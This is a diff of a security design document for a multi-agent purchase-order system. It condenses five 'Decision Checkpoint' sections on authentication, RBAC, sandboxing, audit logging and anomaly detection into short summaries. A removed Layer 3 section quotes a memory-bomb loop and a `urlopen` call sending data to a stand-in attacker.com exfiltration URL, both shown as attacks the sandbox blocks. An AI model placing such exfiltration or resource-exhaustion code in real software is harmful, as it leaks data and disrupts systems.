@@ -408,21 +408,8 @@ async def call_approval_agent_with_managed_identity(payload: dict):
 
 ---
 
-### § 3.3.1.1 DECISION CHECKPOINT — Layer 1 Complete
-
-**What you just saw:**
-- **JWT validation:** Negotiation agent presented token with claims `{agent_id: "nego-01", scopes: ["read", "write"], exp: 1735689600}` → signature valid → expiration 2024-12-31 23:00:00 (future) → **PASS**
-- **API key lookup:** Approval agent sent key `X-API-Key: 4f8a3c2...` → SHA-256 hash matches stored hash for `approval-agent` → **PASS**
-- **Managed identity:** Document generator called metadata endpoint → received signed token for `resource: orderflow-docs` → cloud provider validated instance identity → **PASS**
-
-**What it means:**
-- All three agents successfully proved their identity — no anonymous or forged requests passed Layer 1
-- Token expiration (JWT `exp` claim) forces automatic re-authentication every 1 hour — stolen tokens have limited lifetime
-- Managed identity eliminates credential theft risk — no secrets exist to steal
-
-**What to do next:**
-→ **Layer 2 (Authorization):** Identity confirmed, but does this agent have *permission* to perform the requested action? Move to RBAC policy check.
-→ **For our scenario (PO #2024-1847):** Negotiation agent (identity confirmed) now requests "approve PO at $28,000" — but does it have `approve` permission? Or only `negotiate`?
+> 💡 **Layer 1 verdict:** JWT, API key, and managed-identity paths all validated — no anonymous requests pass; 1-hour JWT expiry limits stolen-token blast radius; managed identity eliminates static-credential theft risk.
+> ➡️ Identity confirmed — Layer 2 now checks whether this agent has *permission* to perform the requested action (§3.3.2).
 
 ---
 
@@ -560,21 +547,8 @@ Token verification checks: (1) signature valid, (2) all caveats satisfied. If an
 
 ---
 
-### § 3.3.2.1 DECISION CHECKPOINT — Layer 2 Complete
-
-**What you just saw:**
-- **RBAC check (PO #2024-1847):** Negotiation agent (role=`negotiator`) requested "approve PO" → permission check: `APPROVE` in `ROLE_PERMISSIONS[negotiator]`? → **NO** → **403 Forbidden**
-- **Retry with correct agent:** Approval agent (role=`approver`) requested "approve PO" → permission check: `APPROVE` in `ROLE_PERMISSIONS[approver]`? → **YES** → **Allowed, proceed to Layer 3**
-- **Capability token (alternate flow):** CFO agent issued capability token `{"action": "approve", "po_id": "2024-1847", "expires": <10 min from now>}` → Deputy agent presented token → signature valid → caveats satisfied (correct PO, not expired) → **Approved**
-
-**What it means:**
-- Identity alone (Layer 1) is not sufficient — negotiation agent had valid JWT but lacked `APPROVE` permission
-- RBAC enforces least privilege: negotiation agents cannot approve, approval agents cannot audit, auditors cannot modify
-- Capability tokens enable safe delegation without permanently granting elevated permissions
-
-**What to do next:**
-→ **Layer 3 (Sandbox):** Authorization granted, but if this action involves executing code (e.g., generating PO document, calling external API), where does that code run? Move to sandboxed execution.
-→ **For our scenario:** Approval agent generates PO document PDF using template engine — this involves running untrusted template code. Sandbox required.
+> 💡 **Layer 2 verdict:** RBAC blocked negotiation agent from approving (403 Forbidden) while granting approval agent the correct permission — least privilege enforced; capability tokens enable safe time-boxed delegation without permanent role escalation.
+> ➡️ Authorization granted — Layer 3 sandboxes the code that now runs (§3.3.3).
 
 ---
 
@@ -722,23 +696,8 @@ print(f"PO #{{data['po_id']}}: ${{data['total_usd']:,.2f}}")
 
 ---
 
-### § 3.3.3.1 DECISION CHECKPOINT — Layer 3 Complete
-
-**What you just saw:**
-- **Sandbox initialization (PO #2024-1847 template):** Approval agent generated Python code to render PO PDF → code written to `/tmp/sandbox-exec-abc123.py` → Docker container spawned → limits: 128MB mem, 50% CPU, no network → **Container running**
-- **Execution monitoring:** Template code allocated 47MB RAM (within limit) → CPU usage 22% (within limit) → completed in 3.2 seconds (within 30s timeout) → **Success, output captured**
-- **Resource limit enforcement (attack scenario):** Injected code `while True: data.append([0]*1000000)` (memory bomb) → container allocated 128MB → OOM killer triggered → **Container killed, exit code 137**
-- **Network isolation enforcement:** Template code attempted `urllib.request.urlopen("http://attacker.com/exfil")` → network disabled → **Connection failed, no data exfiltration**
-
-**What it means:**
-- Code execution contained: even if prompt injection succeeded (agent generated malicious code), sandbox prevented system compromise
-- Resource exhaustion blocked: memory bomb killed before consuming host resources
-- Data exfiltration impossible: no network access, no path to send data out
-- Blast radius: worst case is 128MB container memory + 50% of one CPU core for 30 seconds — no permanent damage
-
-**What to do next:**
-→ **Layer 4 (Audit):** Execution complete (success or failure), but what actually happened? Log structured event for forensics and compliance.
-→ **For our scenario:** Template code executed successfully → PO PDF generated → now log: who requested it (Layer 1 identity), what permission they had (Layer 2 role), what code ran (Layer 3 sandbox), when it happened (Layer 4 timestamp).
+> 💡 **Layer 3 verdict:** Docker sandbox with 128MB/50%-CPU/no-network limits contained both memory-bomb and data-exfiltration attacks — injected code ran but did no permanent damage; blast radius capped at one 30-second container.
+> ➡️ Execution logged by Layer 4 to create tamper-proof forensics trail (§3.3.4).
 
 ---
 
@@ -987,23 +946,8 @@ Returns all authorization denials from today → identify potential attack patte
 
 ---
 
-### § 3.3.4.1 DECISION CHECKPOINT — Layer 4 Complete
-
-**What you just saw:**
-- **Authentication logged (PO #2024-1847):** JWT validation succeeded → event `{"event_type": "auth.success", "agent_id": "agent-appr-01", "timestamp": "2024-12-31T23:15:42Z"}` written to audit log
-- **Authorization decision logged:** RBAC check granted approval permission → event `{"event_type": "authz.granted", "action": "approve_po", "role": "approver"}` written
-- **Sandbox execution logged:** Template rendering started → event `{"event_type": "sandbox.exec.start", "code_hash": "4f8a3c2..."}` → completed successfully → event `{"event_type": "sandbox.exec.success", "duration_ms": 3200}`
-- **Failed attempt logged (alternate scenario):** Negotiation agent attempted approval → authorization denied → event `{"event_type": "authz.denied", "agent_id": "agent-nego-01", "outcome": "denied"}` → **forensics trail preserved**
-
-**What it means:**
-- Every security decision has a permanent, tamper-proof record
-- Logs are queryable: "show all authorization denials for agent-nego-01 in the last 24 hours" returns structured JSON results
-- Compliance satisfied: financial regulations require audit trail of all approval decisions → logs provide that trail
-- Incident response: if attack succeeds, logs show: who authenticated (Layer 1), what permissions they had (Layer 2), what code they ran (Layer 3), and when it happened (Layer 4 timestamp)
-
-**What to do next:**
-→ **Layer 5 (Monitoring):** Logs captured, but are there *patterns* in the logs indicating an attack? Move to anomaly detection and rate limiting.
-→ **For our scenario:** 20 authorization denials from agent-nego-01 in the last 5 minutes — is this a misconfiguration, or an attack? Layer 5 analyzes the pattern.
+> 💡 **Layer 4 verdict:** Structured JSON audit log records every auth/authz/sandbox event with tamper-proof timestamps — compliance satisfied; incident response has full chain-of-custody from JWT claim to code execution.
+> ➡️ Layer 5 watches these logs for anomalous patterns (rate spikes, unusual approval amounts) in §3.3.5.
 
 ---
 
@@ -1327,23 +1271,8 @@ def circuit_breaker_reset(agent_id: str):
 
 ---
 
-### § 3.3.5.1 DECISION CHECKPOINT — Layer 5 Complete
-
-**What you just saw:**
-- **Rate limiting (PO #2024-1847 attack scenario):** Attacker's agent sent 150 approval requests in 60 seconds → rate limit check: 100 req/min exceeded → requests 101–150 blocked with 429 → **Attack throttled**
-- **Anomaly detection:** Approval agent requested $500,000 PO approval → Z-score check: (500000 - 15000) / 8000 = **60.6** (>>3) → anomaly detected → circuit breaker tripped → agent blocked for 5 minutes → **Suspicious activity contained**
-- **Circuit breaker:** After 5-minute cooldown, circuit breaker transitioned to half-open → test request allowed → request succeeded → circuit breaker reset to closed → **Normal operation resumed**
-- **Baseline update:** Over next 6 hours, system observed agent now consistently approving $450k POs (legitimate business change) → baseline updated: new mean $250k, stddev $150k → future $500k POs no longer anomalous
-
-**What it means:**
-- Rate limiting blocked brute-force attack (150 req/min >> 100 limit) before it could overwhelm system
-- Anomaly detection caught suspicious behavior (10× normal PO amount) that wouldn't trigger rate limit
-- Circuit breaker provided automatic response (no human intervention required) and self-healing (auto-reset after test)
-- Baselines adapt to legitimate changes in traffic patterns (business growth, seasonal trends)
-
-**What to do next:**
-→ **All 5 layers complete:** System now has defense-in-depth security architecture. Review end-to-end flow in §4 (How It Works — Step by Step).
-→ **For our scenario (PO #2024-1847):** Attack blocked at multiple layers: Layer 2 (negotiation agent lacked approval permission), Layer 5 (rate limit exceeded). Even if one layer failed, others provided backup defense.
+> 💡 **Layer 5 verdict:** Rate limiting throttled 150-req/min brute-force; Z-score anomaly (60.6σ on $500k PO) tripped circuit breaker automatically; self-healing half-open reset restored normal flow — all 5 defence layers operational.
+> ➡️ End-to-end attack flow reviewed in §4; OrderFlow now meets production security requirements.
 
 ---
 
